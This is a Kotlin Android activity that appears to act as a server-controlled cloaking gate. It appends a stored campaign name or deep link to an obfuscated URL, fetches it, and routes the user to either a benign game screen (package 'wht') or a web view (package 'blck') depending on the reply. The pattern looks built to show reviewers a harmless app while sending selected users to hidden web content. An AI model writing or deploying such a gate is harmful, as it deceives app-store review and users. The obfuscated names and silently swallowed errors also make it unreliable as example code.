package com.tiramisu.driftm.blck

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.orhanobut.hawk.Hawk
import com.tiramisu.driftm.AppS
import com.tiramisu.driftm.databinding.ActivityFiltBinding
import com.tiramisu.driftm.wht.Gams
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class Filt : AppCompatActivity() {
    lateinit var jsoup: String
    lateinit var bindFilt: ActivityFiltBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindFilt = ActivityFiltBinding.inflate(layoutInflater)
        setContentView(bindFilt.root)

        jsoup = ""

        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = coroutineTask()
            Log.d("jsoup status from global scope", jsoup)
        }

        runBlocking {
            try {
                job.join()

                Log.d("jsoup status out of global scope", jsoup)
                bindFilt.txtMain.text = jsoup

                if (jsoup == AppS.jsoupCheck) {
                    Intent(applicationContext, Gams::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, Webb::class.java).also { startActivity(it) }
                }
                finish()
            } catch (e: Exception) {

            }
        }

    }

    private suspend fun coroutineTask(): String {
        val hawk: String? = Hawk.get(AppS.C1, "null")
        val hawkAppLink: String? = Hawk.get(AppS.D1, "null")
        val hawkDevOrNot: String? = Hawk.get(AppS.DEV, "false")


        //added devModeCheck
        val forJsoupSetNaming: String = AppS.lru + AppS.odone + hawk + "&" + AppS.twoSub + hawkDevOrNot
        val forJsoupSetAppLnk: String = AppS.lru + AppS.odone + hawkAppLink + "&" +  AppS.twoSub + hawkDevOrNot

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (hawk != "null") {
                getCodeFromUrl(forJsoupSetNaming)
                Log.d("Check1C", forJsoupSetNaming)
            } else {
                getCodeFromUrl(forJsoupSetAppLnk)
                Log.d("Check1C", forJsoupSetAppLnk)
            }
        }
        return jsoup
    }

    private fun getCodeFromUrl(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                Log.d("jsoup status inside Url function", text)
                jsoup = text
            } else {
                Log.d("jsoup status inside Url function", "is null")
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
}